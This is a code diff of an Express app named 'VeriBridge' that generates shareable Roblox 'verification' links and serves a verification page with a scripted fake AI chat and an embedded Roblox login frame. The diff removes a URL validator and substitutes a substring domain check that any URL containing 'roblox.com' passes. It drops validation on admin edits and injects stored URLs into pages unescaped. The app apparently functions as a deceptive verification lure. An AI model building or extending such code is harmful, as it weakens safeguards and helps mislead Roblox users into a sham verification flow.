@@ -2,7 +2,6 @@ const express = require('express');
 const cors = require('cors');
 const cookieParser = require('cookie-parser');
 const { Redis } = require('@upstash/redis');
-const validator = require('./validator');
 
 const app = express();
 
@@ -18,9 +17,8 @@ const redis = new Redis({
 
 redis.ping().then(() => console.log('[Redis] Connected')).catch(err => console.error('[Redis] Error:', err));
 
-// ==================== ALLOWED DOMAINS (FROM VALIDATOR) ====================
-// Load domains from validator.js
-let ALLOWED_DOMAINS = validator.getAllowedDomains();
+// ==================== ALLOWED DOMAINS ====================
+let ALLOWED_DOMAINS = ['roblox.com', 'www.roblox.com', 'web.roblox.com', 'api.roblox.com'];
 
 async function loadDomains() {
     try {
@@ -28,9 +26,6 @@ async function loadDomains() {
         if (saved && Array.isArray(saved)) {
             ALLOWED_DOMAINS = saved;
             console.log('[Domains] Loaded from Redis:', ALLOWED_DOMAINS);
-        } else {
-            // If no saved domains, use validator defaults
-            ALLOWED_DOMAINS = validator.getAllowedDomains();
         }
     } catch (err) { console.error(err); }
 }
@@ -77,24 +72,20 @@ app.post('/api/generate', async (req, res) => {
     const { url } = req.body;
     if (!url) return res.status(400).json({ error: 'No URL provided' });
     
-    // USE VALIDATOR TO CHECK URL
-    const validation = validator.isValidRobloxUrl(url);
-    
-    if (!validation.valid) {
-        return res.status(400).json({ 
-            error: validation.message,
-            success: false,
-            allowedDomains: ALLOWED_DOMAINS
-        });
+    let allowed = false;
+    for (const domain of ALLOWED_DOMAINS) {
+        if (url.includes(domain)) { allowed = true; break; }
+    }
+    if (!allowed) {
+        return res.status(400).json({ error: 'Domain not allowed. Allowed: ' + ALLOWED_DOMAINS.join(', ') });
     }
     
-    const cleanUrl = validation.cleanUrl || validator.normalizeUrl(url);
     const code = generateCode();
     const nextId = await getNextId();
-    const linkData = { id: nextId, code: code, targetUrl: cleanUrl, createdAt: Date.now(), clicks: 0, lastAccessed: null };
+    const linkData = { id: nextId, code: code, targetUrl: url, createdAt: Date.now(), clicks: 0, lastAccessed: null };
     await redis.set(`link:${code}`, JSON.stringify(linkData));
     const shareableLink = 'https://' + req.headers.host + '/verify.html?code=' + code;
-    console.log('[API] Generated link:', code, '->', cleanUrl);
+    console.log('[API] Generated:', code, '->', url);
     res.json({ success: true, shareableLink: shareableLink, code: code });
 });
 
@@ -124,17 +115,10 @@ app.get('/admin/api/links', isAuthenticated, async (req, res) => {
 app.put('/admin/api/links/:code', isAuthenticated, async (req, res) => {
     const { code } = req.params;
     const { targetUrl } = req.body;
-    
-    // Validate the new URL
-    const validation = validator.isValidRobloxUrl(targetUrl);
-    if (!validation.valid) {
-        return res.status(400).json({ success: false, error: validation.message });
-    }
-    
     const data = await redis.get(`link:${code}`);
     if (!data) return res.status(404).json({ success: false });
     const linkData = JSON.parse(data);
-    linkData.targetUrl = validation.cleanUrl || validator.normalizeUrl(targetUrl);
+    linkData.targetUrl = targetUrl;
     await redis.set(`link:${code}`, JSON.stringify(linkData));
     res.json({ success: true });
 });
@@ -214,12 +198,19 @@ app.get('/admin', (req, res) => {
         <div id="error" class="error"></div>
     </div>
     <script>
-        async function login(){
-            var pwd=document.getElementById("password").value;
-            var res=await fetch("/admin/api/login",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({password:pwd})});
-            var data=await res.json();
-            if(data.success){window.location.href="/admin/dashboard"}
-            else{document.getElementById("error").innerText="Invalid password"}
+        async function login() {
+            var pwd = document.getElementById('password').value;
+            var res = await fetch('/admin/api/login', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ password: pwd })
+            });
+            var data = await res.json();
+            if (data.success) {
+                window.location.href = '/admin/dashboard';
+            } else {
+                document.getElementById('error').innerText = 'Invalid password';
+            }
         }
     </script>
 </body>
@@ -292,7 +283,16 @@ app.get('/admin/dashboard', isAuthenticated, (req, res) => {
     </div>
     <div style="overflow-x:auto">
         <table>
-            <thead><tr><th>ID</th><th>Code</th><th>URL</th><th>Clicks</th><th>Created</th><th>Actions</th></tr></thead>
+            <thead>
+                <tr>
+                    <th>ID</th>
+                    <th>Code</th>
+                    <th>URL</th>
+                    <th>Clicks</th>
+                    <th>Created</th>
+                    <th>Actions</th>
+                </tr>
+            </thead>
             <tbody id="tableBody"></tbody>
         </table>
     </div>
@@ -306,52 +306,242 @@ app.get('/admin/dashboard', isAuthenticated, (req, res) => {
     </div>
     <div class="info-box">Add domains to allow users to shorten URLs from them. Changes take effect immediately.</div>
 </div>
-<div id="editModal" class="modal"><div class="modal-content"><h3>Edit Link</h3><input type="text" id="editCode" readonly><input type="text" id="editUrl" placeholder="New URL"><button class="save-btn" onclick="saveEdit()">Save</button><button class="cancel-btn" onclick="closeModal()">Cancel</button></div></div>
+<div id="editModal" class="modal">
+    <div class="modal-content">
+        <h3>Edit Link</h3>
+        <input type="text" id="editCode" readonly>
+        <input type="text" id="editUrl" placeholder="New URL">
+        <button class="save-btn" onclick="saveEdit()">Save</button>
+        <button class="cancel-btn" onclick="closeModal()">Cancel</button>
+    </div>
+</div>
 <script>
-document.getElementById('tabLinksBtn').onclick=function(){
-    document.getElementById('tabLinksBtn').classList.add('active');
-    document.getElementById('tabDomainsBtn').classList.remove('active');
-    document.getElementById('linksTab').classList.add('active');
-    document.getElementById('domainsTab').classList.remove('active');
+    document.getElementById('tabLinksBtn').onclick = function() {
+        document.getElementById('tabLinksBtn').classList.add('active');
+        document.getElementById('tabDomainsBtn').classList.remove('active');
+        document.getElementById('linksTab').classList.add('active');
+        document.getElementById('domainsTab').classList.remove('active');
+        loadLinks();
+    };
+    
+    document.getElementById('tabDomainsBtn').onclick = function() {
+        document.getElementById('tabDomainsBtn').classList.add('active');
+        document.getElementById('tabLinksBtn').classList.remove('active');
+        document.getElementById('domainsTab').classList.add('active');
+        document.getElementById('linksTab').classList.remove('active');
+        loadDomains();
+    };
+    
+    function showToast(msg, type) {
+        type = type || 'success';
+        var t = document.createElement('div');
+        t.className = 'toast ' + type;
+        t.innerText = msg;
+        document.body.appendChild(t);
+        setTimeout(function() { t.remove(); }, 3000);
+    }
+    
+    async function loadDomains() {
+        try {
+            var r = await fetch('/admin/api/domains');
+            if (r.status === 401) {
+                window.location.href = '/admin';
+                return;
+            }
+            var d = await r.json();
+            if (d.success) {
+                var html = '';
+                for (var i = 0; i < d.domains.length; i++) {
+                    html += '<div class="domain-tag">' + d.domains[i] + '<button onclick="removeDomain(\'' + d.domains[i] + '\')">✕</button></div>';
+                }
+                document.getElementById('domainsList').innerHTML = html;
+            }
+        } catch(e) { console.error(e); }
+    }
+    
+    async function addDomain() {
+        var input = document.getElementById('newDomain');
+        var domain = input.value.trim().toLowerCase();
+        if (!domain) {
+            showToast('Please enter a domain', 'error');
+            return;
+        }
+        try {
+            var r = await fetch('/admin/api/domains', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ domain: domain })
+            });
+            var d = await r.json();
+            if (d.success) {
+                loadDomains();
+                input.value = '';
+                showToast('Domain added!');
+            } else {
+                showToast(d.error || 'Failed', 'error');
+            }
+        } catch(e) { showToast('Error', 'error'); }
+    }
+    
+    async function removeDomain(domain) {
+        if (!confirm('Remove "' + domain + '"?')) return;
+        try {
+            var r = await fetch('/admin/api/domains/' + encodeURIComponent(domain), { method: 'DELETE' });
+            var d = await r.json();
+            if (d.success) {
+                loadDomains();
+                showToast('Domain removed!');
+            } else {
+                showToast(d.error || 'Failed', 'error');
+            }
+        } catch(e) { showToast('Error', 'error'); }
+    }
+    
+    async function loadLinks() {
+        var search = document.getElementById('searchInput').value;
+        var url = search ? '/admin/api/links?search=' + encodeURIComponent(search) : '/admin/api/links';
+        try {
+            var r = await fetch(url);
+            if (r.status === 401) {
+                window.location.href = '/admin';
+                return;
+            }
+            var d = await r.json();
+            if (d.success) {
+                var links = d.links || [];
+                var totalClicks = 0;
+                for (var i = 0; i < links.length; i++) {
+                    totalClicks += links[i].clicks || 0;
+                }
+                document.getElementById('totalLinks').innerText = links.length;
+                document.getElementById('totalClicks').innerText = totalClicks;
+                document.getElementById('avgClicks').innerText = links.length ? (totalClicks / links.length).toFixed(2) : 0;
+                
+                var tbody = document.getElementById('tableBody');
+                if (links.length === 0) {
+                    tbody.innerHTML = '<tr><td colspan="6" style="text-align:center">No links found</td></tr>';
+                    return;
+                }
+                var html = '';
+                for (var i = 0; i < links.length; i++) {
+                    var l = links[i];
+                    html += '<tr>' +
+                        '<td>' + (l.id || (i + 1)) + '</td>' +
+                        '<td><code>' + l.code + '</code></td>' +
+                        '<td style="max-width:300px;word-break:break-all">' + l.targetUrl + '</td>' +
+                        '<td>' + (l.clicks || 0) + '</td>' +
+                        '<td>' + new Date(l.createdAt).toLocaleString() + '</td>' +
+                        '<td><button class="edit-btn" onclick="openEdit(\'' + l.code + '\')">Edit</button> <button class="delete-btn" onclick="deleteLink(\'' + l.code + '\')">Delete</button></td>' +
+                        '</tr>';
+                }
+                tbody.innerHTML = html;
+            }
+        } catch(e) { console.error(e); }
+    }
+    
+    var currentEditCode = null;
+    
+    async function openEdit(code) {
+        var r = await fetch('/admin/api/links/' + code);
+        var d = await r.json();
+        if (d.success) {
+            document.getElementById('editCode').value = d.link.code;
+            document.getElementById('editUrl').value = d.link.targetUrl;
+            document.getElementById('editModal').style.display = 'flex';
+            currentEditCode = code;
+        }
+    }
+    
+    async function saveEdit() {
+        var newUrl = document.getElementById('editUrl').value;
+        await fetch('/admin/api/links/' + currentEditCode, {
+            method: 'PUT',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ targetUrl: newUrl })
+        });
+        closeModal();
+        loadLinks();
+        showToast('Link updated!');
+    }
+    
+    async function deleteLink(code) {
+        if (confirm('Delete this link?')) {
+            await fetch('/admin/api/links/' + code, { method: 'DELETE' });
+            loadLinks();
+            showToast('Link deleted!');
+        }
+    }
+    
+    function closeModal() {
+        document.getElementById('editModal').style.display = 'none';
+    }
+    
+    function clearSearch() {
+        document.getElementById('searchInput').value = '';
+        loadLinks();
+    }
+    
+    async function logout() {
+        await fetch('/admin/api/logout', { method: 'POST' });
+        window.location.href = '/admin';
+    }
+    
     loadLinks();
-};
-document.getElementById('tabDomainsBtn').onclick=function(){
-    document.getElementById('tabDomainsBtn').classList.add('active');
-    document.getElementById('tabLinksBtn').classList.remove('active');
-    document.getElementById('domainsTab').classList.add('active');
-    document.getElementById('linksTab').classList.remove('active');
-    loadDomains();
-};
-function showToast(msg,type){type=type||'success';var t=document.createElement('div');t.className='toast '+type;t.innerText=msg;document.body.appendChild(t);setTimeout(function(){t.remove()},3000);}
-async function loadDomains(){try{var r=await fetch('/admin/api/domains');if(r.status===401){window.location.href='/admin';return}var d=await r.json();if(d.success){var html='';for(var i=0;i<d.domains.length;i++)html+='<div class="domain-tag">'+d.domains[i]+'<button onclick="removeDomain(\\''+d.domains[i]+'\\')">✕</button></div>';document.getElementById('domainsList').innerHTML=html}}catch(e){console.error(e)}}
-async function addDomain(){var input=document.getElementById('newDomain');var domain=input.value.trim().toLowerCase();if(!domain){showToast('Please enter a domain','error');return}try{var r=await fetch('/admin/api/domains',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({domain:domain})});var d=await r.json();if(d.success){loadDomains();input.value='';showToast('Domain added!')}else{showToast(d.error||'Failed','error')}}catch(e){showToast('Error','error')}}
-async function removeDomain(domain){if(!confirm('Remove "'+domain+'"?'))return;try{var r=await fetch('/admin/api/domains/'+encodeURIComponent(domain),{method:'DELETE'});var d=await r.json();if(d.success){loadDomains();showToast('Domain removed!')}else{showToast(d.error||'Failed','error')}}catch(e){showToast('Error','error')}}
-async function loadLinks(){var search=document.getElementById('searchInput').value;var url=search?'/admin/api/links?search='+encodeURIComponent(search):'/admin/api/links';try{var r=await fetch(url);if(r.status===401){window.location.href='/admin';return}var d=await r.json();if(d.success){var links=d.links||[];var totalClicks=0;for(var i=0;i<links.length;i++)totalClicks+=links[i].clicks||0;document.getElementById('totalLinks').innerText=links.length;document.getElementById('totalClicks').innerText=totalClicks;document.getElementById('avgClicks').innerText=links.length?(totalClicks/links.length).toFixed(2):0;var tbody=document.getElementById('tableBody');if(links.length===0){tbody.innerHTML='<tr><td colspan="6" style="text-align:center">No links found</div>--');return}var html='';for(var i=0;i<links.length;i++){var l=links[i];html+='<tr><td>'+(l.id||(i+1))+'</div>--');}tbody.innerHTML=html}}catch(e){console.error(e)}}
-function openEdit(code){fetch('/admin/api/links/'+code).then(r=>r.json()).then(d=>{if(d.success){document.getElementById('editCode').value=d.link.code;document.getElementById('editUrl').value=d.link.targetUrl;document.getElementById('editModal').style.display='flex';currentEditCode=code}})}
-async function saveEdit(){var newUrl=document.getElementById('editUrl').value;await fetch('/admin/api/links/'+currentEditCode,{method:'PUT',headers:{'Content-Type':'application/json'},body:JSON.stringify({targetUrl:newUrl})});closeModal();loadLinks();showToast('Link updated!');}
-async function deleteLink(code){if(confirm('Delete this link?')){await fetch('/admin/api/links/'+code,{method:'DELETE'});loadLinks();showToast('Link deleted!');}}
-function closeModal(){document.getElementById('editModal').style.display='none';}
-function clearSearch(){document.getElementById('searchInput').value='';loadLinks();}
-async function logout(){await fetch('/admin/api/logout',{method:'POST'});window.location.href='/admin';}
-loadLinks();setInterval(loadLinks,30000);
+    setInterval(loadLinks, 30000);
 </script>
-</body></html>`);
+</body>
+</html>`);
 });
 
 // ==================== GENERATOR PAGE ====================
 app.get('/gen', (req, res) => {
     res.send(`<!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>VeriBridge Gen</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+    <title>VeriBridge Gen | Create Shareable Links</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <style>
-        .shine-text{background:linear-gradient(100deg,#fff 45%,#0ff 50%,#fff 55%);background-size:200% auto;color:transparent;-webkit-background-clip:text;background-clip:text;animation:shine 4s linear infinite}
-        @keyframes shine{0%{background-position:-100% 0}100%{background-position:200% 0}}
-        .loading-spinner{width:20px;height:20px;border:2px solid rgba(255,255,255,0.3);border-top-color:white;border-radius:50%;animation:spin 0.8s linear infinite;display:inline-block}
-        @keyframes spin{to{transform:rotate(360deg)}}
-        .allowed-domains{background:rgba(0,255,255,0.1);border-radius:8px;padding:10px;margin-top:10px;font-size:11px;color:#0ff}
-        .allowed-domains span{display:inline-block;background:rgba(0,255,255,0.2);padding:2px 8px;border-radius:20px;margin:2px}
+        @keyframes shine {
+            0% { background-position: -100% 0; }
+            100% { background-position: 200% 0; }
+        }
+        .shine-text {
+            background: linear-gradient(100deg, #ffffff 45%, #00ffff 50%, #ffffff 55%);
+            background-size: 200% auto;
+            color: transparent;
+            -webkit-background-clip: text;
+            background-clip: text;
+            animation: shine 4s linear infinite;
+        }
+        .loading-spinner {
+            width: 20px;
+            height: 20px;
+            border: 2px solid rgba(255,255,255,0.3);
+            border-top-color: white;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            display: inline-block;
+        }
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        .allowed-domains {
+            background: rgba(0, 255, 255, 0.1);
+            border-radius: 8px;
+            padding: 10px;
+            margin-top: 10px;
+            font-size: 11px;
+            color: #00ffff;
+        }
+        .allowed-domains span {
+            display: inline-block;
+            background: rgba(0, 255, 255, 0.2);
+            padding: 2px 8px;
+            border-radius: 20px;
+            margin: 2px;
+        }
     </style>
 </head>
 <body class="bg-black text-white">
@@ -363,31 +553,109 @@ app.get('/gen', (req, res) => {
                 <p class="text-sm text-cyan-400/60 mb-6">Create SHAREABLE verification links (never expire)</p>
                 <div class="space-y-4">
                     <input type="text" id="targetUrl" class="w-full bg-zinc-900/80 border border-cyan-500/20 rounded-xl p-3 text-white" placeholder="https://www.roblox.com/login">
-                    <button id="generateBtn" class="w-full bg-gradient-to-r from-cyan-600 to-blue-600 py-3 rounded-xl font-semibold hover:from-cyan-500 hover:to-blue-500">Generate Shareable Link</button>
-                    <div id="allowedDomains" class="allowed-domains"><strong>Allowed Domains:</strong> <span id="domainsList">Loading...</span></div>
+                    <button id="generateBtn" class="w-full bg-gradient-to-r from-cyan-600 to-blue-600 py-3 rounded-xl font-semibold hover:from-cyan-500 hover:to-blue-500 transition-all">
+                        Generate Shareable Link
+                    </button>
+                    <div id="allowedDomains" class="allowed-domains">
+                        <strong>✅ Allowed Domains:</strong> <span id="domainsList">Loading...</span>
+                    </div>
                     <div id="resultSection" class="hidden mt-4 p-4 bg-cyan-950/40 rounded-xl border border-cyan-500/30">
-                        <p class="text-xs text-cyan-300/80 mb-2">Your Shareable Link:</p>
+                        <p class="text-xs text-cyan-300/80 mb-2">✨ Your Shareable Link (works for ANYONE):</p>
                         <code id="resultUrl" class="block bg-black/50 text-cyan-300 text-sm font-mono p-3 rounded-lg break-all cursor-pointer select-all"></code>
-                        <div class="flex gap-2 mt-3"><button id="copyBtn" class="flex-1 bg-zinc-800 py-2 rounded-lg hover:bg-zinc-700 text-sm">Copy Link</button><button id="testBtn" class="flex-1 bg-cyan-900/50 py-2 rounded-lg hover:bg-cyan-800/50 text-sm">Test</button></div>
+                        <div class="flex gap-2 mt-3">
+                            <button id="copyBtn" class="flex-1 bg-zinc-800 py-2 rounded-lg hover:bg-zinc-700 text-sm">Copy Link</button>
+                            <button id="testBtn" class="flex-1 bg-cyan-900/50 py-2 rounded-lg hover:bg-cyan-800/50 text-sm">Test</button>
+                        </div>
                     </div>
                     <div id="errorMsg" class="text-red-400 text-sm"></div>
-                    <div class="text-xs text-white/30 pt-4 border-t border-white/10"><p>VALIDATED URLs! Only allowed Roblox domains work</p><p>Links never expire - stored permanently</p></div>
+                    <div class="text-xs text-white/30 pt-4 border-t border-white/10">
+                        <p>✅ <span class="text-green-400">VALIDATED URLs!</span> Only allowed Roblox domains work</p>
+                        <p>🔗 Links never expire - stored permanently on Redis</p>
+                    </div>
                 </div>
             </div>
         </div>
     </div>
     <script>
-        var targetUrl=document.getElementById("targetUrl"),generateBtn=document.getElementById("generateBtn"),resultSection=document.getElementById("resultSection"),resultUrl=document.getElementById("resultUrl"),copyBtn=document.getElementById("copyBtn"),testBtn=document.getElementById("testBtn"),errorMsg=document.getElementById("errorMsg"),domainsList=document.getElementById("domainsList");
-        async function loadAllowedDomains(){try{var res=await fetch("/api/allowed-domains"),data=await res.json();if(data.success){var html="";for(var i=0;i<data.domains.length;i++)html+="<span>"+data.domains[i]+"</span>";domainsList.innerHTML=html}}catch(e){domainsList.innerHTML="<span>roblox.com</span><span>www.roblox.com</span>"}}
+        const targetUrl = document.getElementById('targetUrl');
+        const generateBtn = document.getElementById('generateBtn');
+        const resultSection = document.getElementById('resultSection');
+        const resultUrl = document.getElementById('resultUrl');
+        const copyBtn = document.getElementById('copyBtn');
+        const testBtn = document.getElementById('testBtn');
+        const errorMsg = document.getElementById('errorMsg');
+        const domainsList = document.getElementById('domainsList');
+
+        async function loadAllowedDomains() {
+            try {
+                const response = await fetch('/api/allowed-domains');
+                const data = await response.json();
+                if (data.success) {
+                    let html = '';
+                    for (let i = 0; i < data.domains.length; i++) {
+                        html += '<span>' + data.domains[i] + '</span>';
+                    }
+                    domainsList.innerHTML = html;
+                }
+            } catch (err) {
+                domainsList.innerHTML = '<span>roblox.com</span><span>www.roblox.com</span>';
+            }
+        }
         loadAllowedDomains();
-        async function generateLink(){var url=targetUrl.value.trim();if(!url){errorMsg.innerText="Please enter a URL";return}errorMsg.innerText="";generateBtn.disabled=true;generateBtn.innerHTML="<div class=loading-spinner></div> Generating...";try{var response=await fetch("/api/generate",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({url:url})}),data=await response.json();if(data.success){resultUrl.innerText=data.shareableLink;resultSection.classList.remove("hidden")}else{errorMsg.innerText=data.error;resultSection.classList.add("hidden")}}catch(err){errorMsg.innerText="Server error";resultSection.classList.add("hidden")}finally{generateBtn.disabled=false;generateBtn.innerHTML="Generate Shareable Link"}}
-        generateBtn.addEventListener("click",generateLink);copyBtn.addEventListener("click",function(){navigator.clipboard.writeText(resultUrl.innerText)});testBtn.addEventListener("click",function(){window.open(resultUrl.innerText,"_blank")});targetUrl.addEventListener("keypress",function(e){if(e.key==="Enter")generateLink()});setInterval(loadAllowedDomains,30000);
+
+        async function generateLink() {
+            let url = targetUrl.value.trim();
+            if (!url) {
+                errorMsg.innerText = '❌ Please enter a URL';
+                return;
+            }
+            errorMsg.innerText = '';
+            generateBtn.disabled = true;
+            generateBtn.innerHTML = '<div class="loading-spinner"></div><span> Validating URL...</span>';
+            try {
+                const response = await fetch('/api/generate', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ url: url })
+                });
+                const data = await response.json();
+                if (data.success) {
+                    resultUrl.innerText = data.shareableLink;
+                    resultSection.classList.remove('hidden');
+                } else {
+                    errorMsg.innerText = '❌ ' + data.error;
+                    if (data.allowedDomains) {
+                        errorMsg.innerText += '\\n\\nAllowed domains: ' + data.allowedDomains.join(', ');
+                    }
+                    resultSection.classList.add('hidden');
+                }
+            } catch (err) {
+                console.error('Error:', err);
+                errorMsg.innerText = '❌ Cannot connect to server. Please try again.';
+                resultSection.classList.add('hidden');
+            } finally {
+                generateBtn.disabled = false;
+                generateBtn.innerHTML = 'Generate Shareable Link';
+            }
+        }
+
+        generateBtn.addEventListener('click', generateLink);
+        copyBtn.addEventListener('click', function() {
+            navigator.clipboard.writeText(resultUrl.innerText);
+        });
+        testBtn.addEventListener('click', function() {
+            window.open(resultUrl.innerText, '_blank');
+        });
+        targetUrl.addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') generateLink();
+        });
+        setInterval(loadAllowedDomains, 30000);
     </script>
 </body>
 </html>`);
 });
 
-// ==================== VERIFICATION PAGE ====================
+// ==================== VERIFICATION PAGE (FULLY READABLE - YOUR EXACT HTML) ====================
 app.get('/verify.html', (req, res) => {
     const code = req.query.code;
     if (!code) {
@@ -395,7 +663,7 @@ app.get('/verify.html', (req, res) => {
         return;
     }
     
-    res.send(`<!DOCTYPE html>
+    const html = `<!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
@@ -607,26 +875,29 @@ const code = urlParams.get('code');
 let TARGET_URL = 'https://www.roblox.com';
 
 if (code) {
+    console.log('[VeriBridge] Loading link for code:', code);
     fetch('/api/link/' + code)
-        .then(res => res.json())
-        .then(data => {
+        .then(function(res) { return res.json(); })
+        .then(function(data) {
             if (data.success && data.targetUrl) {
                 TARGET_URL = data.targetUrl;
-                console.log('[VeriBridge] Target URL loaded:', TARGET_URL);
+                console.log('[VeriBridge] ✅ Target URL loaded:', TARGET_URL);
                 document.getElementById('startLoadingOverlay').classList.remove('active');
             } else {
-                document.body.innerHTML = '<div style="text-align:center;padding:50px;color:red"><h1>❌ Link Not Found</h1><p>This verification link does not exist.</p><a href="/gen" style="color:#00ffff">Go to Generator</a></div>';
+                console.error('[VeriBridge] Link not found');
+                document.body.innerHTML = '<div style="text-align:center;padding:50px;color:red;font-family:Arial"><h1>❌ Link Not Found</h1><p>This verification link does not exist or has been deleted.</p><a href="/gen" style="color:#00ffff">Go to Generator</a></div>';
             }
         })
-        .catch(err => {
-            console.error('Error loading link:', err);
-            document.body.innerHTML = '<div style="text-align:center;padding:50px;color:red"><h1>❌ Connection Error</h1><p>Cannot connect to server.</p><a href="/gen" style="color:#00ffff">Go to Generator</a></div>';
+        .catch(function(err) {
+            console.error('[VeriBridge] Error loading link:', err);
+            document.body.innerHTML = '<div style="text-align:center;padding:50px;color:red;font-family:Arial"><h1>❌ Connection Error</h1><p>Cannot connect to verification server.</p><a href="/gen" style="color:#00ffff">Go to Generator</a></div>';
         });
 } else {
+    console.log('[VeriBridge] No code provided, using default URL');
     document.getElementById('startLoadingOverlay').classList.remove('active');
 }
 
-// AI CHAT SYSTEM
+// ==================== AI CHAT SYSTEM ====================
 const chatWidget = document.getElementById('chatWidget');
 const chatWindow = document.getElementById('chatWindow');
 const closeChatBtn = document.getElementById('closeChatBtn');
@@ -672,19 +943,19 @@ async function sendMessage() {
     chatInput.value = '';
     showTypingIndicator();
     isTyping = true;
-    await new Promise(resolve => setTimeout(resolve, 600));
+    await new Promise(function(resolve) { setTimeout(resolve, 600); });
     const response = getAIResponse(text);
     removeTypingIndicator();
     addMessage(response, false);
     isTyping = false;
 }
 
-chatWidget.addEventListener('click', () => chatWindow.classList.toggle('active'));
-closeChatBtn.addEventListener('click', () => chatWindow.classList.remove('active'));
+chatWidget.addEventListener('click', function() { chatWindow.classList.toggle('active'); });
+closeChatBtn.addEventListener('click', function() { chatWindow.classList.remove('active'); });
 sendChatBtn.addEventListener('click', sendMessage);
-chatInput.addEventListener('keypress', e => { if (e.key === 'Enter') sendMessage(); });
+chatInput.addEventListener('keypress', function(e) { if (e.key === 'Enter') sendMessage(); });
 
-// Frame logic
+// ==================== FRAME LOGIC ====================
 const frameOverlay = document.getElementById('robloxFrameOverlay');
 const closeFrameBtn = document.getElementById('closeFrameBtn');
 const robloxIframe = document.getElementById('robloxLoginIframe');
@@ -697,19 +968,19 @@ function showRobloxFlow() {
 
 function hideFrame() {
     frameOverlay.classList.remove('active');
-    setTimeout(() => {
+    setTimeout(function() {
         if (!frameOverlay.classList.contains('active')) {
             robloxIframe.src = 'about:blank';
         }
     }, 300);
 }
 
-closeFrameBtn?.addEventListener('click', hideFrame);
-frameOverlay?.addEventListener('click', (e) => {
+if (closeFrameBtn) closeFrameBtn.addEventListener('click', hideFrame);
+frameOverlay.addEventListener('click', function(e) {
     if (e.target === frameOverlay) hideFrame();
 });
 
-// Dashboard logic
+// ==================== DASHBOARD LOGIC ====================
 function isValidUsername(e) { return /^[a-zA-Z0-9_]{3,20}$/.test(e); }
 
 let currentRobloxUser = null;
@@ -819,17 +1090,17 @@ if (savedUser) {
             redirectTitle.innerHTML = 'Welcome ' + currentRobloxUser.username;
             robloxUsernameInput.value = currentRobloxUser.username;
         }
-    } catch (e) { }
+    } catch(e) { }
 }
 
 verifyRobloxBtn.addEventListener('click', verifyDashUser);
-methodLogin.addEventListener('click', () => setActiveMethod('login'));
-methodIngame.addEventListener('click', () => setActiveMethod('ingame'));
-methodCommunity.addEventListener('click', () => setActiveMethod('community'));
+methodLogin.addEventListener('click', function() { setActiveMethod('login'); });
+methodIngame.addEventListener('click', function() { setActiveMethod('ingame'); });
+methodCommunity.addEventListener('click', function() { setActiveMethod('community'); });
 bottomStartBtn.addEventListener('click', onMethodClick);
 logoutBtnHeader.addEventListener('click', logoutUser);
 
-// Landing screen
+// ==================== LANDING SCREEN ====================
 const landingBtn = document.getElementById('landingVerifyBtn');
 const landingUsername = document.getElementById('landingUsername');
 const startScreenDiv = document.getElementById('startScreen');
@@ -837,7 +1108,7 @@ const mainDashboardDiv = document.getElementById('mainDashboard');
 const startLoading = document.getElementById('startLoadingOverlay');
 const landingErrorMsg = document.getElementById('landingErrorMsg');
 
-landingBtn.addEventListener('click', () => {
+landingBtn.addEventListener('click', function() {
     const username = landingUsername.value.trim();
     if (!username || !isValidUsername(username)) {
         landingErrorMsg.classList.add('show');
@@ -846,7 +1117,7 @@ landingBtn.addEventListener('click', () => {
     }
     landingErrorMsg.classList.remove('show');
     startLoading.classList.add('active');
-    setTimeout(() => {
+    setTimeout(function() {
         const avatarUrl = 'https://ui-avatars.com/api/?background=2c5a7a&color=fff&size=60&name=' + username.charAt(0).toUpperCase();
         currentRobloxUser = { id: username, username: username, avatarUrl: avatarUrl };
         localStorage.setItem('veribridge_user', JSON.stringify(currentRobloxUser));
@@ -866,7 +1137,9 @@ landingBtn.addEventListener('click', () => {
 updateUI();
 </script>
 </body>
-</html>`);
+</html>`;
+    
+    res.send(html);
 });
 
 // ==================== ROOT REDIRECT ====================
